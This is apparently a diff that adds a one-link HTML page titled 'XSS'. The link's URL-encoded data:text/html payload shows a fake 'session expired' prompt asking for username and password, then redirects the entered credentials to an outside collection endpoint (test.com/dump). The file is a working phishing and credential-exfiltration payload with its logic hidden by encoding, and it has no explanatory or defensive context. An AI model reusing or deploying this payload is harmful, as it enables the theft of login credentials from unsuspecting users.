@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="UTF-8">
+    <title>XSS</title>
+</head>
+
+<body>
+    <h1>Open </h1>
+
+
+    <a href="data:text/html,%3Ch1%3ECrash%3C%2Fh1%3E%3Cscript%3Evar%20r%3Dprompt('You%20are%20logging%20out%20cause%20your%20session%20is%20expired.%5Cn%5CnEnter%20your%20credential.%5Cn%5CnField%201%3A%20Username%5CnField%202%3A%20Password%5Cn%5CnFormat%3A%20username%7Cpassword')%3Bif(r)%7Bvar%20parts%3Dr.split('%7C')%3Bif(parts.length%3D%3D2)%7Bvar%20u%3Dparts%5B0%5D.trim()%3Bvar%20p%3Dparts%5B1%5D.trim()%3Bif(u%26%26p)%7Bwindow.location%3D'https%3A%2F%2Ftest.com%2Fdump%3Femail%3D'%2BencodeURIComponent(u)%2B'%26password%3D'%2BencodeURIComponent(p)%3B%7Delse%7Balert('Both%20fields%20are%20required')%3Bwindow.close()%3B%7D%7Delse%7Balert('Please%20use%20format%3A%20username%7Cpassword')%3Bwindow.close()%3B%7D%7Delse%7Bwindow.close()%3B%7D%3C%2Fscript%3E"
+        target="_blank">Open link here</a>
+
+
+</body>
+
+</html>
